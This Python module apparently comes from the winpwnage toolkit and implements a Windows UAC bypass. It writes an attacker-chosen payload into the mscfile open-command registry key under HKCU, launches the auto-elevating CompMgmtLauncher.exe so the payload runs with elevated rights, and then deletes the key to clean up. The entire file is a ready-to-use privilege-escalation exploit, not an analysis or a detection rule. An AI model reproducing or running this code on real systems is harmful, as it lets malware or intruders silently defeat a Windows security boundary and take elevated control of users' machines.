import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

compmgmtlauncher_info = {
	"Description": "Bypass UAC using compmgmtlauncher and registry key manipulation",
	"Id": "9",
	"Type": "UAC bypass",
	#"Fixed In": "15031",
	"Fixed In": "15031" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "compmgmtlauncher",
	"Function Payload": True,
}


def compmgmtlauncher(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Software\\Classes\\mscfile\\shell\\open\\command"))
			_winreg.SetValueEx(key, None, 0, _winreg.REG_SZ, payload)
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("CompMgmtLauncher.exe"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))

		time.sleep(5)

		try:
			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, os.path.join("Software\\Classes\\mscfile\\shell\\open\\command"))
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
